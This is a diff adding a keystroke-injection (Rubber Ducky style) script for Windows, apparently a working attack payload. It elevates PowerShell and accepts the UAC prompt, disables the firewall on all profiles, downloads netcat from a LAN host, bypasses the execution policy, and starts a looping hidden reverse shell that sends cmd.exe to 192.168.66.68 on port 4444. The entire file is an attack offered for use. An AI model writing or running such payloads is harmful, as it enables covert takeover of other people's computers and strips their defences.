@@ -1,0 +1,37 @@
+DELAY 2000
+GUI  r
+DELAY 300
+STRING powershell 
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING netsh advfirewall set allprofiles state off 
+ENTER 
+DELAY 800
+STRING exit
+ENTER
+DELAY 1000
+
+
+GUI r
+DELAY 1000
+
+STRING cmd
+ENTER
+DELAY 1000
+
+STRING echo (wget 'http://192.168.66.68/nc64.exe' -OutFile a.exe) > b.ps1
+ENTER
+DELAY 1000
+STRING powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 5000
+
+STRING echo while($true){./a.exe 192.168.66.68 4444 -e cmd.exe -d} > c.ps1
+ENTER
+DELAY 1000
+
+STRING start /min powershell -ExecutionPolicy ByPass -File c.ps1 & exit
+DELAY 1000
+ENTER
